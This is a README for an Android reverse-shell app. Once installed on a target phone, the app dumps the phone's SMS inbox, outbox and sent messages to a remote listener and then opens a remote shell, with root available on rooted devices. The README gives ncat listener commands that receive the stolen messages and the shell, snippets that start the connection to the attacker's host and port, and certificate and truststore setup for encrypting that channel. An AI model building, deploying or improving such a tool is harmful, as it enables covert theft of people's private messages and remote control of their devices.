Droid Reverse Shell
===================
Ian Cohee 
---------------------

A small, very basic reverse shell for the Android mobile operating system. The code can be compiled into an APK package, that must be installed
on the target device. The application will dump the SMS contents of the device inbox, outbox, and sent mail, then drop into the shell. The resulting shell will be unprivileged, unless the target phone is rooted, then the command "su" can be used. In that case, the user still needs to manually give the application permission to "su" to UID 0. 

Secured vs. Unsecured Shell
--------------------------
By default, the connection is made using a 'SecureConnectionThread,' but can be changed to use a 'ConnectionThread' instead, for cleartext, yet faster, transfer of data.
Secure

    // UI cannot do networking stuff on its own, it needs
    // a separate thread. 
    new SecureConnectionThread().execute(host, port);


Insecure

    // UI cannot do networking stuff on its own, it needs
    // a separate thread. 
    new ConnectionThread().execute(host, port);

Listener (default: secured)
--------
The program `ncat` should be used as a listener by default, for it's native support of SSL. I have included the PEM file containing the private key and certificate together (used by the listener) and a PEM file containing just the certificate, which was imported into the BKS keystore `android.truststore`.

    ncat --ssl --ssl-cert /path/to/Ncat_priv.pem --ssl-key /path/to/Ncat_priv.pem -l -p 7777 | tee server.out

Listener (unsecured)
--------
Still working on that (I'll have it when I get SSL or Symmetric key encryption added) in the mean time, a simple netcat-like listener works. I prefer to use Ncat, of the Nmap project. Since the application dumps SMS, I like to pipe them to `tee` to capture the results. The Listener will have logging, when I get to it. 

    ncat 192.168.2.3 7777 | tee server.out

Mini-tutorials
==============

Generating a TrustStore
-----------------------
    keytool -genkey -keystore android.truststore -alias android -storetype BKS -providerpath /path/to/bcprov-jdk15on-146.jar -provider org.bouncycastle.jce.provider.BouncyCastleProvider

Generating X509 Certificate
---------------------------
This file will contain the both the private key, and the certificate into a file called `cert.pem`.
    
    openssl req -newkey rsa:2048 -nodes -days 3650 -x509 -keyout cert.pem -out cert.pem

Then extract the everything between the `-----BEGIN_CERTIFICATE-----` and `-----END_CERTIFICATE-----` (inclusively) into a new file. Now This file needs to be added to the trust store that the application uses. 

Importing Certificate into TrustStore
-------------------------------------
    keytool -importcert -trustcacerts -keystore android.truststore -file cert.pem -storetype BKS -providerpath /path/to/bcprov-jdk15on-146.jar -provider org.bouncycastle.jce.provider.BouncyCastleProvider 

Adding Bouncy Castle to java.security File
------------------------------------------
Locate the correct security file, mine was a symlink in /usr

    locate java.security

Add an entry, where X is the next ordinal number to the java.security file
    
    security.provider.X=org.bouncycastle.jce.provider.BouncyCastleProvider